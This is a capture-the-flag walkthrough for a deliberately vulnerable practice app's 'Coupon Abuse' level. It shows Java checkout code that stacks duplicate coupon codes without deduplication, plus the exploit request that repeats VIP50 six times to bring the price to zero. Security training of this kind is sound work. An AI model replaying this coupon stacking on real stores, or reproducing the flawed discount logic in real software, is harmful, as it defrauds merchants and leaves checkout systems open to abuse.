# Level 2 — Coupon Abuse

## Challenge Description

This challenge simulates a VIP membership purchase where the checkout API accepts a coupon code array but does not deduplicate or limit the quantity. Reuse the same coupon to accumulate discounts beyond the original price for a free purchase.

**Objective**: Exploit the coupon reuse vulnerability to reduce the final price to $0 and capture the Flag.

## Vulnerability Analysis

### Code Logic

Backend code: `CouponAbuseController.java`

```
GET  /api/challenge/biz-logic/coupon/checkout  — Get order and coupon info
POST /api/challenge/biz-logic/coupon/pay        — Checkout payment
```

| Coupon | Discount |
|--------|----------|
| SUMMER30 | $30 |
| WELCOME20 | $20 |
| VIP50 | $50 |

**Vulnerability**: The `couponCodes` array can contain duplicate codes without deduplication or quantity limits. Accumulating $300 in discounts (6 × VIP50) exceeds the $299.99 price.

### Source Code Snippet

```java
BigDecimal totalDiscount = BigDecimal.ZERO;
for (String code : couponCodes) {
    BigDecimal discount = COUPON_DISCOUNTS.get(normalized);
    if (discount != null) {
        totalDiscount = totalDiscount.add(discount);  // No dedup check
    }
}
if (finalPrice.compareTo(BigDecimal.ZERO) <= 0) {
    String flag = flagService.getFlag("business-logic", "level2");
}
```

## Walkthrough

### Step 1: View Products and Coupons

```
GET /api/challenge/biz-logic/coupon/checkout
```

### Step 2: Reuse Coupons

Submit the same coupon multiple times:

```json
POST /api/challenge/biz-logic/coupon/pay
{
  "couponCodes": ["VIP50", "VIP50", "VIP50", "VIP50", "VIP50", "VIP50"]
}
```

### Step 3: Capture the Flag

Free purchase returns the Flag.

## Related Files

| File | Description |
|------|-------------|
| `controller/challenge/businesslogic/CouponAbuseController.java` | Backend coupon checkout endpoint |
| `service/FlagService.java` | Flag retrieval and validation |
